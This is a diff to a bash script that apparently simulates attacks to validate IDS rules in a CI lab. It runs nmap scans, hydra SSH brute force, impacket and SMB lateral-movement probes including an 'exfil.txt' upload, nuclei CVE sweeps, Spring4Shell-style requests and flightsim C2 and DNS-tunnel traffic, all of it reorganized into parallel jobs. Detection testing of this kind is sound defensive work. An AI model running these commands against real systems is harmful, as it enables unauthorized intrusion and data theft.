@@ -7,25 +7,116 @@ VICTIM_IP="${1:?Usage: $0 <victim_private_ip>}"
 
 echo "=== Starting attack simulation against ${VICTIM_IP} ==="
 
-# ---------- Network Reconnaissance ----------
+# ---------- Parallel background probe groups ----------
+# The six groups below each block on a long operation (nmap scans, nikto
+# cap, hydra brute-force, impacket lateral probes, nuclei CVE sweep,
+# flightsim external traffic). They target independent services on the
+# victim (or external destinations for flightsim) and have no data
+# dependency on the fast-serial probes that follow — so fan them out as
+# background subshells and `wait` at the end.
+#
+# Wall-clock: max(slowest group, fast-serial-remainder) ≈ 2-3 min vs. the
+# ~6 min baseline when the whole battery was serial. Each subshell tees
+# to its own log file so CI output stays readable after `wait` (the logs
+# are dumped in a deterministic order via ::group::/::endgroup:: markers).
+# verify_alerts.sh parses eve.json on the sensor — it doesn't care about
+# this script's stdout ordering, so fanning out is safe.
 
-echo "[1/13] ICMP ping sweep"
-ping -c 5 "${VICTIM_IP}" || true
+LOGDIR="$(mktemp -d -t attack-parallel.XXXXXX)"
 
-echo "[2/13] Nmap SYN scan (top 100 ports)"
-nmap -sS -T4 --top-ports 100 "${VICTIM_IP}" || true
+run_nmap_group() {
+  echo "[BG/nmap] [1] ICMP ping sweep"
+  ping -c 5 "${VICTIM_IP}" || true
+  echo "[BG/nmap] [2] Nmap SYN scan (top 100 ports)"
+  nmap -sS -T4 --top-ports 100 "${VICTIM_IP}" || true
+  echo "[BG/nmap] [3] Nmap service/version detection"
+  nmap -sV -T4 -p 22,80,443 "${VICTIM_IP}" || true
+  echo "[BG/nmap] [4] Nmap OS detection"
+  sudo nmap -O "${VICTIM_IP}" || true
+  echo "[BG/nmap] [5] Nmap vulnerability scripts"
+  nmap --script vuln -p 22,80 "${VICTIM_IP}" || true
+  echo "[BG/nmap] [6] Nmap CVE detection (vulners)"
+  nmap --script vulners -sV -p 22,80 "${VICTIM_IP}" || true
+}
 
-echo "[3/13] Nmap service/version detection"
-nmap -sV -T4 -p 22,80,443 "${VICTIM_IP}" || true
+run_hydra_group() {
+  echo "[BG/hydra] [10] SSH brute force attempts"
+  # Feed hydra a real (small) password list so it generates >=15 ssh_auth_failed
+  # events, which is the threshold Zeek's protocols/ssh/detect-bruteforcing uses
+  # to raise SSH::Password_Guessing.
+  PWLIST=$(mktemp)
+  printf '%s\n' password 123456 admin root toor letmein qwerty welcome \
+    admin123 changeme passw0rd monkey dragon master sunshine princess \
+    football abc123 iloveyou trustno1 baseball >"$PWLIST"
+  hydra -l admin -P "$PWLIST" -t 4 -w 5 -f "ssh://${VICTIM_IP}" 2>/dev/null || true
+  rm -f "$PWLIST"
+  for user in root admin test oracle postgres mysql; do
+    ssh -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=2 \
+      "${user}@${VICTIM_IP}" 2>/dev/null || true
+  done
+}
 
-echo "[4/13] Nmap OS detection"
-sudo nmap -O "${VICTIM_IP}" || true
+run_nikto_group() {
+  echo "[BG/nikto] [12] Nikto web scanner"
+  nikto -h "http://${VICTIM_IP}" -maxtime 30 2>/dev/null || true
+}
 
-echo "[5/13] Nmap vulnerability scripts"
-nmap --script vuln -p 22,80 "${VICTIM_IP}" || true
+run_lateral_smb_group() {
+  echo "[BG/lateral] [31] Lateral movement — SMB tree connects + named pipes"
+  # Tree connect attempts to admin shares (denied by Samba but the SMB
+  # exchange is visible to rules). timeout 10 — a firewalled 445 would
+  # otherwise black-hole SYN and hang smbclient for ~75s.
+  timeout 10 smbclient -N "//${VICTIM_IP}/ADMIN\$" -c 'ls' 2>/dev/null || true
+  timeout 10 smbclient -N "//${VICTIM_IP}/C\$" -c 'ls' 2>/dev/null || true
+  timeout 10 smbclient -N "//${VICTIM_IP}/IPC\$" -c 'help' 2>/dev/null || true
+  timeout 10 impacket-psexec "administrator:wrongpass@${VICTIM_IP}" 'whoami' 2>/dev/null || true
+  timeout 10 impacket-services "administrator:wrongpass@${VICTIM_IP}" list 2>/dev/null || true
+  timeout 10 impacket-reg "administrator:wrongpass@${VICTIM_IP}" query -keyName HKLM\\SYSTEM 2>/dev/null || true
+  timeout 10 impacket-samrdump "administrator:wrongpass@${VICTIM_IP}" 2>/dev/null || true
+  timeout 10 impacket-atexec "administrator:wrongpass@${VICTIM_IP}" 'whoami' 2>/dev/null || true
+  timeout 10 smbclient "//${VICTIM_IP}/lab" -N -c 'ls; put /etc/hostname exfil.txt' 2>/dev/null || true
+  timeout 10 impacket-lookupsid "guest:@${VICTIM_IP}" 2>/dev/null || true
+}
 
-echo "[6/13] Nmap CVE detection (vulners)"
-nmap --script vulners -sV -p 22,80 "${VICTIM_IP}" || true
+run_nuclei_group() {
+  echo "[BG/nuclei] [34] nuclei CVE template sweep (Vulhub listeners + nginx)"
+  if command -v nuclei >/dev/null 2>&1; then
+    timeout 180 nuclei \
+      -u "http://${VICTIM_IP}" \
+      -u "http://${VICTIM_IP}:8080" \
+      -u "http://${VICTIM_IP}:8983" \
+      -tags cve,log4j,spring,solr \
+      -rate-limit 30 -timeout 5 -silent -stats=false \
+      -exclude-severity info,low \
+      -o /tmp/nuclei-results.txt 2>/dev/null || true
+    echo "  nuclei findings: $(wc -l < /tmp/nuclei-results.txt 2>/dev/null || echo 0)"
+  else
+    echo "  nuclei not installed; skipping"
+  fi
+}
+
+run_flightsim_group() {
+  echo "[BG/flightsim] [35] flightsim purpose-built IDS validator traffic"
+  if command -v flightsim >/dev/null 2>&1; then
+    # Modules are independent AlphaSOC probes hitting different destinations
+    # — fan them out so wall-clock is max(module timeout) not sum.
+    for mod in c2 dga tunnel-dns miner; do
+      (echo "  flightsim run $mod"; timeout 90 flightsim run "$mod" 2>/dev/null) &
+    done
+    wait
+  else
+    echo "  flightsim not installed; skipping"
+  fi
+}
+
+run_nmap_group        > "$LOGDIR/nmap.log"      2>&1 & NMAP_PID=$!
+run_hydra_group       > "$LOGDIR/hydra.log"     2>&1 & HYDRA_PID=$!
+run_nikto_group       > "$LOGDIR/nikto.log"     2>&1 & NIKTO_PID=$!
+run_lateral_smb_group > "$LOGDIR/lateral.log"   2>&1 & LATERAL_PID=$!
+run_nuclei_group      > "$LOGDIR/nuclei.log"    2>&1 & NUCLEI_PID=$!
+run_flightsim_group   > "$LOGDIR/flightsim.log" 2>&1 & FLIGHTSIM_PID=$!
+
+echo "=== 6 background probe groups launched; running fast serial probes inline ==="
 
 # ---------- Web Application Attacks ----------
 
@@ -107,23 +198,7 @@ curl -s -o /dev/null "http://${VICTIM_IP}/autodiscover/autodiscover.json?@zdi/Po
 echo "[9/13] IDS test (testmyids.com)"
 curl -s "http://testmyids.com/" || true
 
-# ---------- SSH Brute Force ----------
-
-echo "[10/13] SSH brute force attempts (hydra)"
-# Feed hydra a real (small) password list so it generates >=15 ssh_auth_failed
-# events, which is the threshold Zeek's protocols/ssh/detect-bruteforcing uses
-# to raise SSH::Password_Guessing. -P /dev/null is a no-op.
-PWLIST=$(mktemp)
-printf '%s\n' password 123456 admin root toor letmein qwerty welcome \
-  admin123 changeme passw0rd monkey dragon master sunshine princess \
-  football abc123 iloveyou trustno1 baseball >"$PWLIST"
-hydra -l admin -P "$PWLIST" -t 4 -w 5 -f "ssh://${VICTIM_IP}" 2>/dev/null || true
-rm -f "$PWLIST"
-# Generate failed SSH login attempts
-for user in root admin test oracle postgres mysql; do
-  ssh -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=2 \
-    "${user}@${VICTIM_IP}" 2>/dev/null || true
-done
+# ---------- SSH Brute Force: moved to background group run_hydra_group ----------
 
 # ---------- DNS Flood ----------
 
@@ -132,10 +207,7 @@ for i in $(seq 1 20); do
   dig @1.1.1.1 "$(head -c 20 /dev/urandom | xxd -p).test.example.com" +short 2>/dev/null || true
 done
 
-# ---------- Nikto Web Scanner ----------
-
-echo "[12/13] Nikto web scanner"
-nikto -h "http://${VICTIM_IP}" -maxtime 30 2>/dev/null || true
+# ---------- Nikto Web Scanner: moved to background group run_nikto_group ----------
 
 # ---------- Command Injection Patterns ----------
 
@@ -958,31 +1030,7 @@ curl -s -o /dev/null --max-time 5 \
   --tls-max 1.2 --ciphers ECDHE-RSA-AES128-SHA256 \
   https://1.1.1.1/ 2>/dev/null || true
 
-# ---------- Lateral Movement — SMB / DCERPC (Iteration 4) ----------
-echo "[31] Lateral movement primitives — SMB tree connects + named pipes"
-
-# Tree connect attempts to admin shares (will be denied by samba but
-# the SMB protocol exchange happens and our rules see the share name).
-# timeout 10 on each — victim may have no SMB listener, and a firewalled
-# 445 black-holes SYN rather than RST, which would hang smbclient for ~75s.
-timeout 10 smbclient -N "//${VICTIM_IP}/ADMIN\$" -c 'ls' 2>/dev/null || true
-timeout 10 smbclient -N "//${VICTIM_IP}/C\$" -c 'ls' 2>/dev/null || true
-timeout 10 smbclient -N "//${VICTIM_IP}/IPC\$" -c 'help' 2>/dev/null || true
-
-# Named-pipe + DCERPC exchanges via impacket (preinstalled on Kali)
-# These will fail auth but exercise the SMB/DCERPC pipeline enough
-# to populate smb.named_pipe / dcerpc.iface buffers.
-timeout 10 impacket-psexec "administrator:wrongpass@${VICTIM_IP}" 'whoami' 2>/dev/null || true
-timeout 10 impacket-services "administrator:wrongpass@${VICTIM_IP}" list 2>/dev/null || true
-timeout 10 impacket-reg "administrator:wrongpass@${VICTIM_IP}" query -keyName HKLM\\SYSTEM 2>/dev/null || true
-timeout 10 impacket-samrdump "administrator:wrongpass@${VICTIM_IP}" 2>/dev/null || true
-timeout 10 impacket-atexec "administrator:wrongpass@${VICTIM_IP}" 'whoami' 2>/dev/null || true
-
-# Also try against the misconfigured guest-writable lab share so impacket
-# actually proceeds past session setup and reaches the juicy named-pipe
-# / DCERPC exchanges our rules look for.
-timeout 10 smbclient "//${VICTIM_IP}/lab" -N -c 'ls; put /etc/hostname exfil.txt' 2>/dev/null || true
-timeout 10 impacket-lookupsid "guest:@${VICTIM_IP}" 2>/dev/null || true
+# ---------- Lateral Movement — SMB / DCERPC: moved to background group run_lateral_smb_group ----------
 
 # ---------- JA3 fingerprint triggers (Iteration 5) ----------
 echo "[32] JA3 TLS fingerprint probes"
@@ -1042,38 +1090,8 @@ ss.close()
 # time-bounded so the sweep can't blow the attack-battery budget.
 # -tags cve,oast restricts to CVE templates; most will 404/miss but the
 # ones that DO match produce high-signal labeled traffic.
-echo "[34] nuclei CVE template sweep (Vulhub listeners + nginx)"
-if command -v nuclei >/dev/null 2>&1; then
-  timeout 180 nuclei \
-    -u "http://${VICTIM_IP}" \
-    -u "http://${VICTIM_IP}:8080" \
-    -u "http://${VICTIM_IP}:8983" \
-    -tags cve,log4j,spring,solr \
-    -rate-limit 30 -timeout 5 -silent -stats=false \
-    -exclude-severity info,low \
-    -o /tmp/nuclei-results.txt 2>/dev/null || true
-  echo "  nuclei findings: $(wc -l < /tmp/nuclei-results.txt 2>/dev/null || echo 0)"
-else
-  echo "  nuclei not installed; skipping"
-fi
-
-# ---------- flightsim IDS-validator traffic ----------
-# AlphaSOC flightsim generates purpose-built malicious-looking traffic:
-# - c2:           contacts ~500 known-C2 domains (triggers reputation rules)
-# - dga:          resolves domain-generation-algorithm domains
-# - tunnel-dns:   long TXT queries to sandbox.alphasoc.xyz (trips DNS tunnel SIDs)
-# - miner:        mining pool stratum protocol (trips cryptocurrency rules)
-# Requires attacker-ENI mirror session (see validate-detections.yml) —
-# without it these destinations never cross the sensor's visible wire.
-echo "[35] flightsim purpose-built IDS validator traffic"
-if command -v flightsim >/dev/null 2>&1; then
-  for mod in c2 dga tunnel-dns miner; do
-    echo "  flightsim run $mod"
-    timeout 90 flightsim run "$mod" 2>/dev/null || true
-  done
-else
-  echo "  flightsim not installed; skipping"
-fi
+# nuclei sweep + flightsim traffic: moved to background groups
+# run_nuclei_group + run_flightsim_group (see top of script).
 
 # ---------- GitHub token exfil — plain-HTTP POST (SIDs 9000504 / 9000505) ----------
 # Rules 9000504/9000505 match on http.request_body with pcre:/gh[sp]_[A-Za-z0-9]{36,}/
@@ -1118,5 +1136,22 @@ timeout 10 curl -s -o /dev/null --max-time 5 -X POST \
   "http://${VICTIM_IP}:8080/" || true
 timeout 10 curl -s -o /dev/null --max-time 5 \
   "http://${VICTIM_IP}:8080/?class.module.classLoader.URLs%5B0%5D=0" || true
+
+echo "=== Fast serial probes complete; waiting on background groups ==="
+wait "$NMAP_PID"      2>/dev/null || true
+wait "$HYDRA_PID"     2>/dev/null || true
+wait "$NIKTO_PID"     2>/dev/null || true
+wait "$LATERAL_PID"   2>/dev/null || true
+wait "$NUCLEI_PID"    2>/dev/null || true
+wait "$FLIGHTSIM_PID" 2>/dev/null || true
+
+# Dump the six background-group logs in a stable, named order so CI output
+# is deterministic even though the groups finished in arbitrary order.
+for g in nmap hydra nikto lateral nuclei flightsim; do
+  echo "::group::bg-${g}"
+  cat "$LOGDIR/${g}.log" 2>/dev/null || true
+  echo "::endgroup::"
+done
+rm -rf "$LOGDIR"
 
 echo "=== Attack simulation complete ==="
